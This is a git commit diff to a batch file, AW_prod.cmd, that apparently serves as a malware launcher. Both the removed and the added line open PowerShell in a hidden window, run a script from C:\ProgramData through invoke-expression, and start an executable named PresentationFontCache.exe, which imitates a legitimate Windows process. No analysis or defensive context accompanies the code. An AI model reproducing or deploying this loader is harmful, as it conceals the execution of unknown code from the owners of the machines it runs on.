881c3fdf76983232b475d5d0fd7a4ff26329a7ef
qwertyuiopindia <93660031+qwertyuiopindia@users.noreply.github.com>
2023-01-12 16:59:51 +0600

    Update AW_prod.cmd

--- AW_prod.cmd
+++ AW_prod.cmd
@@ -1,1 +1,1 @@
-start powershell -windowstyle hidden "cat -raw C:\ProgramData\script.ps1 | invoke-expression"; Start-Process -FilePath "C:\ProgramData\PresentationFontCache.exe"; Exit
+start powershell -windowstyle hidden Start-Process -FilePath "C:\ProgramData\PresentationFontCache.exe"; "cat -raw C:\ProgramData\script.ps1 | invoke-expression"; Exit
